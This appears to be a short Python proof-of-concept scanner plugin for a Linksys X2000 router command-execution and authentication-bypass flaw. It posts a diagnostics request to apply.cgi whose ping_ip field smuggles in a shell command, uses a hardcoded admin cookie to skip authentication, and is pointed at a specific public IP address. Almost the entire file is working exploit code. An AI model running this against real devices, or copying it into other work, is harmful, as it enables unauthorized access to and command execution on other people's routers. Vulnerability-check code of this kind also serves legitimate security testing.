#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urlparse
import time
import re

"""
POC Name  :  Linksys X2000 Command Execution AND Unauthorized access
Author    :  a
mail      :  a@lcx.cc
Referer   :  https://packetstormsecurity.com/files/134190/Linksys-X2000-Command-Execution.html
"""

def assign(service, arg):
    if service == 'linksys':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    data = 'submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&nowait=1&ping_size=32&ping_times=5&ping_ip=ls'
    url = arg + 'apply.cgi'
    code, head,res, errcode, _ = curl.curl2(url,data,Cookie= 'wys_userid=admin,wys_passwd=5982861B34B74E9A6DAD66A9895CDFFF')
    if 'X2000'  in res and 'You must input an IP Address or Domain Name' in res:
        security_hole('Linksys X2000 Command Execution AND Unauthorized access!')


if __name__ == '__main__':
    from dummy import *
    audit(assign('linksys', 'http://217.208.43.226:8080/')[1])